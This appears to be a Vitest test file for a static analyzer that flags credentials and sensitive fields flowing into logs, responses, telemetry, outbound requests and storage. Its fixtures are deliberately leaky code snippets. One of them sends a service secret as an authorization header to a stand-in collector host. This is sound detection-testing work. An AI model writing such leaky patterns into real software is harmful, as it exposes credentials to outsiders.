import { describe, expect, it } from 'vitest';
import {
  analyzeAstSource,
  createAstProjectAnalysis
} from '../../src/analyzers/ast/source-analysis.js';

describe('sensitive data flow candidates', () => {
  it('traces aliased and destructured credential environment values to nested log payloads', () => {
    const findings = analyzeAstSource(
      'src/telemetry.ts',
      [
        'const { API_TOKEN: token } = process.env;',
        'const payload = { auth: { bearer: token } };',
        'setTimeout(async () => {',
        '  await logger.info({ ...payload });',
        '}, 0);'
      ].join('\n')
    );
    const finding = findings.find((item) => item.ruleId === 'TLP-DATA-001');
    expect(finding).toMatchObject({
      category: 'sensitive-data',
      severity: 'high',
      confidence: 'medium',
      location: { file: 'src/telemetry.ts', line: 4 },
      metadata: {
        sourceClass: 'credential-like environment or sensitive-field value',
        sinkClass: 'log'
      }
    });
    expect(JSON.stringify(finding)).not.toContain('API_TOKEN');
    expect(JSON.stringify(finding)).not.toContain('bearer');
  });

  it('detects credential exposure in responses and outbound requests', () => {
    const findings = analyzeAstSource(
      'src/routes/token.ts',
      [
        'const secret = process.env.SERVICE_SECRET;',
        'res.json({ secret });',
        'await fetch("https://collector.invalid", { headers: { authorization: secret } });'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');
    expect(findings.map((item) => item.metadata?.sinkClass)).toEqual([
      'response',
      'outbound-request'
    ]);
  });

  it('tracks credential values through async local parameters and return aliases', () => {
    const findings = analyzeAstSource(
      'src/telemetry.ts',
      [
        'async function passThrough(value: string) { return await value; }',
        'function emit(value: string) { logger.info({ value }); }',
        'async function handler() {',
        '  const token = process.env.API_TOKEN;',
        '  emit(await passThrough(token));',
        '}'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings).toHaveLength(1);
    expect(findings[0]?.metadata?.sinkClass).toBe('log');
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('follows credential values through a cross-file exported helper', () => {
    const root = '/toolip-sensitive-flow';
    const route = `import { emit } from './logger.js';
export async function handler() {
  await emit(process.env.API_TOKEN);
}`;
    const logger = `export async function emit(value: string) {
  await logger.info({ value });
}`;
    const project = createAstProjectAnalysis([
      {
        filePath: 'routes.ts',
        absolutePath: `${root}/routes.ts`,
        content: route
      },
      {
        filePath: 'logger.ts',
        absolutePath: `${root}/logger.ts`,
        content: logger
      }
    ]);

    const findings = analyzeAstSource('logger.ts', logger, project).filter(
      (item) => item.ruleId === 'TLP-DATA-001'
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]?.metadata?.sinkClass).toBe('log');
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('does not report values passed through recognized redaction helpers', () => {
    const findings = analyzeAstSource(
      'src/logging.ts',
      [
        'const token = process.env.API_TOKEN;',
        'logger.info({ token: redactSensitive(token) });',
        'console.error(maskSecret(token));'
      ].join('\n')
    );
    expect(findings.some((item) => item.ruleId === 'TLP-DATA-001')).toBe(false);
  });

  it('tracks sensitive object fields without exposing their values and honors redaction', () => {
    const findings = analyzeAstSource(
      'src/profile.ts',
      [
        'async function handler(req: RequestLike, profile: Profile) {',
        '  const password = req.body.password;',
        '  const email = profile.email;',
        '  logger.info({ password });',
        '  telemetry.track({ email });',
        '  res.json({ email: redactSensitive(email) });',
        '}'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');
    expect(findings.map((item) => item.metadata?.sinkClass)).toEqual([
      'log',
      'telemetry'
    ]);
    expect(JSON.stringify(findings)).not.toContain('password');
    expect(JSON.stringify(findings)).not.toContain('email');
  });

  it('reports credential flows to explicit file, browser and database storage sinks', () => {
    const findings = analyzeAstSource(
      'src/storage.ts',
      [
        "import { writeFile } from 'node:fs/promises';",
        "import { db } from './database.js';",
        'async function persist() {',
        '  const secret = process.env.SERVICE_TOKEN;',
        "  await writeFile('/tmp/cache', secret);",
        "  localStorage.setItem('credential', secret);",
        '  await db.users.updateOne({ id: 1 }, { $set: { apiToken: secret } });',
        '}'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings.map((finding) => finding.metadata?.sinkClass)).toEqual([
      'storage',
      'storage',
      'storage'
    ]);
    expect(
      findings.every(
        (finding) =>
          finding.severity === 'medium' && finding.confidence === 'low'
      )
    ).toBe(true);
    expect(JSON.stringify(findings)).not.toContain('SERVICE_TOKEN');
    expect(JSON.stringify(findings)).not.toContain('apiToken');
  });

  it('does not treat ordinary set methods or removals as persistence sinks', () => {
    const findings = analyzeAstSource(
      'src/storage.ts',
      [
        'const secret = process.env.SERVICE_TOKEN;',
        'cache.set(secret);',
        "localStorage.removeItem('credential');"
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings).toHaveLength(0);
  });
});
